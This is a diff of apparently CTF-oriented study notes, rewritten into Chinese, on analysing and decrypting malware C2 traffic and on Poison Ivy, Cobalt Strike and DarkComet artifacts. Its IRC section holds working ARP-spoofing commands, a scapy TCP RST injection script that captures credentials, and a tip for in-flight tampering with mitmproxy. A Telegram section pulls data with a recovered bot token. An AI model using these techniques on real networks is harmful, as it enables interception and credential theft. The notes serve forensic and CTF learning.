@@ -1,261 +1,255 @@
-# C2 Traffic and Protocol Analysis
-
-## Table of Contents
-- [PCAP Analysis](#pcap-analysis)
-- [Custom Crypto Protocols](#custom-crypto-protocols)
-- [C2 Traffic Patterns](#c2-traffic-patterns)
-- [Network Indicators](#network-indicators)
-- [RC4-Encrypted WebSocket C2 Traffic](#rc4-encrypted-websocket-c2-traffic)
-- [Password Rotation in C2](#password-rotation-in-c2)
-- [AES-CBC in Malware](#aes-cbc-in-malware)
-- [Identifying Encryption Algorithms](#identifying-encryption-algorithms)
-- [Telegram Bot API for Evidence Recovery](#telegram-bot-api-for-evidence-recovery)
-- [Poison Ivy RAT Traffic Decryption (Trend Micro CTF 2015)](#poison-ivy-rat-traffic-decryption-trend-micro-ctf-2015)
-- [DarkComet RAT Forensics (CrewCTF 2023)](#darkcomet-rat-forensics-crewctf-2023)
-- [Cobalt Strike Beacon Analysis in PCAP (FireShell CTF 2020)](#cobalt-strike-beacon-analysis-in-pcap-fireshell-ctf-2020)
-- [ARP Spoof + TCP RST Injection to Capture IRC C2 Creds (TAMUctf 2019)](#arp-spoof--tcp-rst-injection-to-capture-irc-c2-creds-tamuctf-2019)
-
 ---
 
-## PCAP Analysis
+phase: binary
+vuln_class: [malware, c2, traffic-analysis, crypto]
+title: C2 流量与协议分析
+summary: 流量题的解法是「先认加密算法，再找密钥，最后按时间拼接解密」。判据是魔数、端口异常、心跳间隔，不是逐个包肉眼看。
+---
+
+# C2 流量与协议分析
+
+PE/.NET 样本侧的配置提取见 [[binary/恶意样本/pe-and-dotnet.md|PE 与 .NET]]；脚本混淆与内存取证见 [[binary/恶意样本/scripts-and-obfuscation.md|脚本与混淆]]；流量侧的通用取证见 [[forensics/流量分析/|流量分析]]。
+
+## 0. 判据速查
+
+| 观察到的现象 | 说明 | 去哪节 |
+|---|---|---|
+| 非标准端口跑已知协议（21 端口不是 FTP） | 端口被改，需要重映射 | §1 |
+| 固定间隔、等长的短请求 | Beacon 心跳 | §3 |
+| 只有 DNS 查询，子域长且字符集受限 | DNS 隧道 | §3 |
+| 明文里出现 `expand 32-byte k` / `0x9E3779B9` | ChaCha20 / TEA | §4 |
+| 二进制里 256 字节顺序初始化表 | RC4 | §4 |
+| WSS 但证书异常 / 非 443 | 可能自签 TLS 套 RC4 | §5 |
+| 密码每隔固定时间变 | 密钥轮转，解密器要同步 | §6 |
+| pcap 里是 `PASS`/`JOIN`/`PRIVMSG` | IRC C2 | §9 |
+| 流量看起来"什么都没有" | 有隐藏网段，做 ARP 欺骗 | §9 |
+
+**最容易犯的错**：拿到 pcap 就肉眼翻。先跑协议统计和端口分布，通常一眼能看出形态。
+
+## 1. 起点：协议统计
 
 ```bash
-tshark -r file.pcap -Y "tcp.stream eq X" -T fields -e tcp.payload
+# 协议分层统计
+tshark -r file.pcap -q -z io,phs
+
+# 端口对话
+tshark -r file.pcap -q -z conv,tcp
+
+# 按流导出原始 payload
+tshark -r file.pcap -Y "tcp.stream eq 3" -T fields -e tcp.payload
+
+# 提取 HTTP 响应体（找投放的载荷）
+tshark -r capture.pcap -Y "http.response" -T fields -e http.file_data | xxd -r -p > payload.bin
 ```
-Look for C2 communication patterns on unusual ports (e.g., port 21 not for FTP).
 
-## Custom Crypto Protocols
+要点：
 
-- Stream ciphers may share keystream state for both directions
-- Concatenate ALL payloads chronologically before decryption
-- Look for hardcoded keys in `.rodata`
-- **ChaCha20 keystream extraction:** Send large nullbytes payload (0 XOR anything = anything)
-- Alternative: Pipe ciphertext from pcap directly into the binary
-
-## C2 Traffic Patterns
-
-- Beaconing: regular intervals
-- Domain generation algorithms (DGA)
-- Encoded/encrypted payloads
-- HTTP(S) with custom headers
-- DNS tunneling
-
-## Network Indicators
+- **`io,phs` 先看协议分布**。如果 90% 是 DNS 且请求量巨大，直接进 DNS 隧道方向，不用看别的。
+- **`conv,tcp` 看谁跟谁说了多少**。少量长连接 + 大量短连接，是「控制通道 + 数据外带」的典型形态。
+- 端口被改过时用 `tcprewrite` 重映射，让 Wireshark 能正确解析：
 
 ```bash
-# Extract IPs/domains
-strings malware | grep -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'
-strings malware | grep -E '[a-zA-Z0-9.-]+\.(com|net|org|io)'
-
-# DNS queries
-tshark -r capture.pcap -Y "dns.qry.name" -T fields -e dns.qry.name | sort -u
+tcprewrite --infile=in.pcap --outfile=out.pcap \
+  --portmap=8080:443 --fixcsum
 ```
 
-## RC4-Encrypted WebSocket C2 Traffic
+## 2. 自定义加密协议
 
-**Pattern (Tampered Seal):** Malware uses WSS over non-standard port with RC4 encryption.
+```text
+1. 找硬编码密钥 —— 通常在 .rodata / .rdata，或在配置解密后的结构里
+2. 判断是流密码还是块密码 —— 有无 padding、有无固定块长
+3. 流密码：把两个方向的 payload 按时间顺序全部拼接
+4. 块密码：确认 IV 来源（硬编码 / 密文前 N 字节 / 全零）
+```
 
-**Decryption workflow:**
-1. Identify C2 port from malware source (not standard 443)
-2. Remap port with `tcprewrite` so Wireshark decodes TLS
-3. Add RSA key for TLS decryption -> reveals WebSocket frames
-4. Find RC4 key hardcoded in malware binary
-5. Decrypt each WebSocket payload with RC4 via CyberChef
+**流密码必须双向拼接**，这是最常见的失败原因。密钥流状态在双向之间共享，只取客户端→服务端方向，解密出来的第二段开始全是乱的。
 
-**Malware communication patterns:**
-- Registration message: hostname, OS, username, privileges
-- Exfiltration: screenshots, keylog data, file contents
-- Commands: reverse shell, file download, process list
+**ChaCha20 白拿密钥流**：发一段全零明文，密文就等于密钥流（`0 XOR k = k`）。拿到密钥流后可以直接异或任意密文。
 
-## Password Rotation in C2
+**另一条路：把 pcap 的密文直接喂给样本本身**。样本里有完整的解密逻辑，构造输入让它输出明文，比手工实现加密算法可靠。
 
-**Pattern:** C2 uses rotating passwords based on time/sequence
+## 3. C2 形态识别
 
-**Analysis:**
-1. Find password generation function
-2. Identify rotation trigger (time-based, message count)
-3. Sync your decryptor with the rotation
+| 形态 | 特征 | 提取方法 |
+|---|---|---|
+| Beacon 心跳 | 固定间隔（±抖动）、等长、内容近乎不变 | 按时间排序看间隔分布 |
+| DGA | 每次请求域名无规律但字符集一致 | 收集全部域名做 n-gram / 长度分析 |
+| DNS 隧道 | 子域超长、base32/base64 编码、TXT 记录多 | 拼接子域再解码 |
+| HTTP 自定义头 | header 里带 base64 长串 | `tshark -T fields -e http.request.full_uri` |
+| 加密载荷 | 高熵、等长块 | 判算法后解密 |
+
+```bash
+# DNS 隧道：按时间顺序拿全部查询名
+tshark -r capture.pcap -Y "dns.qry.name" -T fields -e dns.qry.name -e frame.time_epoch \
+  | sort -k2 -n | awk '{print $1}'
+```
+
+**顺序很关键**：DNS 隧道的数据是按查询顺序拼接的，`sort -u` 会破坏顺序，必须带时间戳排。
+
+## 4. 按常量认算法
+
+| 算法 | 特征 |
+|---|---|
+| AES | S-box 起始 `0x637c777b`，表里连续 `0x63` |
+| ChaCha20 | 字符串 `expand 32-byte k`，或常量 `0x61707865` |
+| TEA / XTEA | `0x9E3779B9`（黄金比例倒数） |
+| RC4 | 256 字节顺序初始化的 S-box（`for i in 0..255: S[i]=i`） |
+| Base64 | 字符集 `A-Za-z0-9+/=`，长度 %4==0 |
+
+按结构辅助判断：
+
+```text
+块密码：固定块长（16 字节）、有 padding、密文长度是块长整数倍
+流密码：逐字节、无 padding、密文长度等于明文长度
+哈希：无逆、固定输出长度、有轮常量
+```
+
+## 5. RC4 over WebSocket（WSS）
+
+**特征**：WSS 跑在非标准端口，证书是自签或异常，TLS 解密后是 WebSocket 帧，帧内还是密文。
+
+```text
+解密流程：
+1. 从样本源码确认 C2 端口（不是 443）
+2. tcprewrite 重映射端口，让 Wireshark 按 TLS 解析
+3. 提供 RSA 私钥解 TLS（私钥在样本里，或在题目附件里）
+4. 得到 WebSocket 帧
+5. 从样本二进制里找 RC4 密钥
+6. 逐帧 RC4 解密
+```
+
+样本的通信内容通常分三类：
+
+```text
+注册：主机名、OS 版本、用户名、权限级别
+外带：截图、键盘记录、文件内容
+指令：反弹 shell、文件下载、进程列表
+```
+
+## 6. 密钥轮转
+
+密钥随时间或消息计数变化时，解密器必须同步：
 
 ```python
+import hashlib
+
 def get_current_password(timestamp):
-    # Password changes every hour
+    # 每小时换一次
     hour_bucket = timestamp // 3600
     return hashlib.sha256(f"seed_{hour_bucket}".encode()).digest()
 ```
 
-## AES-CBC in Malware
+要点：
 
-**Common key derivation:**
-- MD5/SHA256 of hardcoded string
-- Derived from timestamp or PID
-- Password-based (PBKDF2)
+- **先找到轮转的触发条件**：时间桶、消息计数、还是服务端下发的 nonce。
+- 时间桶要确认**用的是哪个时钟**：UTC、本地时区、还是启动后的相对时间。差 8 小时就全错。
+- 消息计数型轮转要求你从**第一条消息**开始数，丢包会导致后续全错位。
 
-**Analysis approach:**
+## 7. AES-CBC
+
+最常见的三个默认假设，按顺序试：
+
 ```python
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import unpad
 import hashlib
 
-# Common pattern: key = MD5(password)
-password = b"hardcoded_password"
-key = hashlib.md5(password).digest()
+# 假设 1：key = MD5(硬编码口令)
+key = hashlib.md5(b"hardcoded_password").digest()
 
-# IV often first 16 bytes of ciphertext
-iv = ciphertext[:16]
-ct = ciphertext[16:]
+# 假设 2：IV = 密文前 16 字节
+iv, ct = ciphertext[:16], ciphertext[16:]
 
-cipher = AES.new(key, AES.MODE_CBC, iv)
-plaintext = unpad(cipher.decrypt(ct), 16)
+# 假设 3：PKCS#7 padding
+plaintext = unpad(AES.new(key, AES.MODE_CBC, iv).decrypt(ct), 16)
 ```
 
-## Identifying Encryption Algorithms
+其他密钥来源：硬编码字符串的 SHA256、时间戳派生、PID 派生、PBKDF2。
 
-**By constants:**
-- AES: `0x637c777b`, `0x63636363` (S-box)
-- ChaCha20: `expand 32-byte k` or `0x61707865`
-- RC4: Sequential S-box initialization
-- TEA/XTEA: `0x9E3779B9` (golden ratio)
+**先验证再批量解**：拿第一条消息试，能解出可读文本再处理全部。全部试一遍再发现密钥不对，浪费的是时间。
 
-**By structure:**
-- Block cipher: Fixed-size blocks, padding
-- Stream cipher: Byte-by-byte, no padding
-- Hash: Mixing functions, rounds, constants
+## 8. 具体家族特征
 
-## Telegram Bot API for Evidence Recovery
+### 8.1 Poison Ivy（Camellia）
 
-**Pattern (Stomaker):** Malware uses Telegram bot to exfiltrate stolen data.
+```text
+密码 → 直接 null 补齐到 32 字节作为密钥，没有任何 KDF
+默认口令 "admin"，常被原样保留
+端口常见 3460 / 65535
+握手阶段有 256 字节密钥交换
+密文块长度 8 字节对齐
+```
 
-**Recover exfiltrated data via bot token:**
 ```python
-# If you have the bot API token from malware source:
-import requests
-
-TOKEN = "bot_token_here"
-# Get updates (message history)
-r = requests.get(f"https://api.telegram.org/bot{TOKEN}/getUpdates")
-# Download files sent to bot
-file_id = "..."
-r = requests.get(f"https://api.telegram.org/bot{TOKEN}/getFile?file_id={file_id}")
-file_path = r.json()['result']['file_path']
-requests.get(f"https://api.telegram.org/file/bot{TOKEN}/{file_path}")
+from Crypto.Cipher import Camellia
+key = b"admin".ljust(32, b"\x00")[:32]
+plaintext = Camellia.new(key, Camellia.MODE_ECB).decrypt(encrypted_data)
 ```
 
----
-
-## Poison Ivy RAT Traffic Decryption (Trend Micro CTF 2015)
-
-**Pattern:** PCAP contains Poison Ivy RAT (Remote Access Trojan) traffic. Poison Ivy uses Camellia cipher with the key derived from an attacker-supplied password (null-padded to key length). The default password is "admin".
+或用 ChopShop 一步到位（会自动重建会话、还原截图与键盘记录）：
 
 ```bash
-# Decrypt using MITRE's ChopShop framework + FireEye Poison Ivy module
 chopshop -f capture.pcap -s ./output/ "poisonivy_23x -c -w admin"
 ```
 
-**Identification:**
-- Traffic to non-standard ports (often 3460, 65535)
-- Initial handshake with 256-byte key exchange
-- Encrypted data blocks with 8-byte aligned lengths
+试的口令顺序：`admin` → `password` → `p0ison` → 题目提示。
 
-**Alternative decryption (Python):**
-```python
-from Crypto.Cipher import Camellia
+### 8.2 Cobalt Strike
 
-password = b"admin"
-key = password.ljust(32, b'\x00')[:32]  # null-pad to 256 bits
-cipher = Camellia.new(key, Camellia.MODE_ECB)
-plaintext = cipher.decrypt(encrypted_data)
+```text
+默认 URI：/submit.php  /pixel  /__utm.gif  /ca  /dpixel
+Cookie 里是 base64 编码的元数据
+默认 60 秒 sleep，带 jitter
+User-Agent 与 Malleable C2 profile 一致
 ```
 
-**Key insight:** Poison Ivy's encryption key is derived solely from the attacker password with null-byte padding — no key derivation function. The default password "admin" is commonly left unchanged. ChopShop with `poisonivy_23x` module automates full session reconstruction (screenshots, file listings, keystrokes). Also try common passwords: "password", "p0ison", or challenge-provided hints.
+```bash
+pip install dissect.cobaltstrike
+python3 -c "
+from dissect.cobaltstrike import BeaconConfig
+cfg = BeaconConfig.from_path('beacon.bin', all_xor_keys=True)
+print(cfg)
+"
+```
 
----
+输出包含 C2 地址、sleep、jitter、URI 路径、User-Agent、watermark。**Malleable C2 只改 HTTP 外观，不改 beacon 的二进制结构**，所以从抓到的载荷里仍能提出完整配置。
 
-## DarkComet RAT Forensics (CrewCTF 2023)
+### 8.3 DarkComet
 
-Identify and analyze DarkComet RAT artifacts in memory dumps and disk images.
+```text
+键盘记录：%APPDATA%/dclogs/YYYY-MM-DD-N.dc（明文，含窗口标题）
+默认端口：1604
+互斥体：通常含 "DarkComet" 或自定义串
+持久化：HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+进程：常注入 svchost.exe / explorer.exe
+```
 
 ```bash
-# DarkComet keylogger log locations:
-# %APPDATA%/dclogs/YYYY-MM-DD-N.dc
-# Format: plaintext with window titles and keystrokes
-
-# Volatility: find DarkComet artifacts
 vol -f memory.dmp windows.filescan | grep -i dclogs
-vol -f memory.dmp windows.filescan | grep -i "\.dc$"
-
-# Dump the keylogger files
 vol -f memory.dmp windows.dumpfiles --dump-dir=output -Q <physical_address>
-
-# DarkComet persistence:
-# Registry: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
-# Points to: rundll32.exe wrapper or direct executable
-# Check with:
 vol -f memory.dmp windows.registry.printkey --key "Software\Microsoft\Windows\CurrentVersion\Run"
-
-# DarkComet network indicators:
-# Default port: 1604
-# Mutex: typically "DarkComet" or custom string
-# Process: often injects into legitimate process (svchost.exe, explorer.exe)
 vol -f memory.dmp windows.netscan | grep 1604
 ```
 
-**Key insight:** DarkComet stores offline keylogger data in `.dc` files under `%APPDATA%/dclogs/` with date-stamped filenames. These survive in memory dumps and can be carved with Volatility's filescan + dumpfiles. Check the Run registry key for persistence mechanisms.
+`.dc` 文件是**明文**，dump 出来直接读，不用解密。
 
----
+## 9. 非 HTTP C2 的中间人
 
-## Cobalt Strike Beacon Analysis in PCAP (FireShell CTF 2020)
-
-Detect and decode Cobalt Strike beacon traffic from network captures.
+IRC、自定义 TCP 这类协议，`mitmproxy --mode transparent` 的默认配置不认。用 ARP 欺骗 + 伪造 RST 让客户端重新握手：
 
 ```bash
-# Cobalt Strike beacon indicators in PCAP:
-# - HTTP GET/POST to /submit.php, /pixel, /__utm.gif, /ca, /dpixel (default URIs)
-# - Cookie contains base64-encoded metadata
-# - Regular check-in intervals (default: 60s sleep)
-# - User-Agent matches common Malleable C2 profiles
-
-# Wireshark filters for CS traffic:
-# http.request.uri contains "submit.php" or http.request.uri contains "__utm"
-# http.cookie contains base64 pattern
-
-# Decode beacon config from captured DLL/shellcode:
-# pip install dissect.cobaltstrike
-python3 -c "
-from dissect.cobaltstrike import BeaconConfig
-dump_path = 'beacon.bin'
-config = BeaconConfig.from_path(dump_path, all_xor_keys=True)
-print(config)
-# Shows: C2 server, sleep time, jitter, URI paths, user-agent, watermark
-"
-
-# Extract beacon from PCAP:
-tshark -r capture.pcap -Y "http.response" -T fields -e http.file_data | xxd -r -p > payload.bin
-# Then analyze with dissect.cobaltstrike or CobaltStrikeParser
-```
-
-**Key insight:** Cobalt Strike uses "Malleable C2" profiles that customize HTTP indicators, but the underlying beacon protocol structure is consistent. Look for regular-interval HTTP requests with encoded cookies/parameters. The `dissect.cobaltstrike` Python library can extract full beacon configs from captured payloads.
-
----
-
-## ARP Spoof + TCP RST Injection to Capture IRC C2 Creds (TAMUctf 2019)
-
-**Pattern (Alt-F4 for Ops):** CTF network looks empty (nmap on `172.30.0.0/28` shows only a gateway at `.1` and one peer at `.2`), but the gateway routes to a hidden IRC C2 server (`172.30.20.10`). Legitimate clients connect with a `PASS` command we never get to see. Mount a classic MITM:
-
-```bash
-# 1. Poison the LAN so .2's traffic to .1 flows through our box
+# 1. 毒化 LAN，让受害者的流量经过我们
 sudo arpspoof -i tap0 -r -t 172.30.0.2 172.30.0.1
 
-# 2. Route the hidden subnet through the spoofed gateway
+# 2. 把隐藏网段路由到被欺骗的网关
 sudo route add -net 172.30.20.0/28 gw 172.30.0.1 dev tap0
-
-# 3. Wireshark / tcpdump reveals the IRC server, but we land mid-session
-#    (no PASS captured). Force a reconnect by spoofing a TCP RST.
 ```
 
-Use scapy to forge a RST into the live stream so the client reconnects and re-sends `PASS`:
+抓到的是**会话中段**，看不到最初的 `PASS`。用 scapy 伪造 RST 打断现有连接，逼客户端重连：
 
 ```python
 from scapy.all import sniff, send, IP, TCP
+
 VICTIM, SERVER = "172.30.0.2", "172.30.20.10"
 
 def kill(p):
@@ -268,8 +262,51 @@ def kill(p):
 sniff(iface="tap0", filter=f"host {SERVER} and tcp port 6667", prn=kill)
 ```
 
-A few seconds later the intercepted stream contains `PASS underling` and `JOIN #void`. Same technique run from a pivot bot recovers the server-operator secret (`OPER baal darksecret`). For inline payload rewriting, mitmproxy's `rawtcp.py` layer can be edited directly to drop `buf = buf.replace(b'old', b'new')` inside the TCP relay, giving arbitrary protocol MITM without an HTTP plugin.
+重连后的流里就能看到 `PASS underling`、`JOIN #void`。**不需要破解认证，只要逼客户端在你面前再认证一次。**
 
-**Key insight:** Non-HTTP C2 (IRC, custom TCP) defeats `mitmproxy --mode transparent` defaults, but ARP spoofing plus forged RSTs turn any long-lived TCP session into a replayable handshake — you do not need to crack the auth, you just force the client to perform it again in front of you. Combine with mitmproxy raw-TCP source edits for in-flight payload substitution when you need to stay invisible to both endpoints.
+需要在线改包（不只是旁听）时，改 mitmproxy 的 `rawtcp.py`，在 TCP 中继里加 `buf = buf.replace(b'old', b'new')`，就能对任意协议做透明篡改。
 
-**References:** TAMUctf 2019 — Alt-F4 for Ops, writeup 13478
+## 10. Telegram Bot 取证
+
+样本用 bot 做外带时，拿到 token 就能直接取回历史数据：
+
+```python
+import requests
+
+TOKEN = "bot_token_here"
+r = requests.get(f"https://api.telegram.org/bot{TOKEN}/getUpdates")
+
+file_id = "..."
+r = requests.get(f"https://api.telegram.org/bot{TOKEN}/getFile?file_id={file_id}")
+file_path = r.json()["result"]["file_path"]
+requests.get(f"https://api.telegram.org/file/bot{TOKEN}/{file_path}")
+```
+
+要点：`getUpdates` 只返回**最近 24 小时**的更新，且被 `getUpdates` 取过的会失效。如果 token 还有效，尽快拉。
+
+## 11. 网络指标速取
+
+```bash
+# IP
+strings malware | grep -E '([0-9]{1,3}\.){3}[0-9]{1,3}'
+
+# 域名
+strings malware | grep -E '[a-zA-Z0-9.-]+\.(com|net|org|io|xyz|top)'
+
+# URL
+strings malware | grep -iE 'https?://|ws://|wss://'
+
+# DNS 查询全量
+tshark -r capture.pcap -Y "dns.qry.name" -T fields -e dns.qry.name | sort -u
+```
+
+## 12. 纪律
+
+- **先统计再细看**。`io,phs` 和 `conv,tcp` 两条命令能省掉大半肉眼翻包的时间。
+- **流密码必须双向按时间拼接**。单方向解密从第二段开始就是乱码，这是最高频的失败原因。
+- **加密流量先认算法，再找密钥**。按魔数认比读反汇编快一个数量级。
+- **DNS 隧道要带时间戳排序**。`sort -u` 会毁掉拼接顺序，解出来是乱序数据。
+- **AES 先试「MD5(硬编码) + IV 取密文前 16 字节」**，这两个默认假设命中率很高。
+- **只解第一条验证，别批量试**。密钥错了批量跑一遍纯浪费。
+- **非 HTTP C2 不要指望 mitmproxy 默认模式**。ARP + RST 是最通用的入口。
+- **抓到的是会话中段时，逼重连比猜协议快**。你不需要破解认证，只需要它再认证一次。
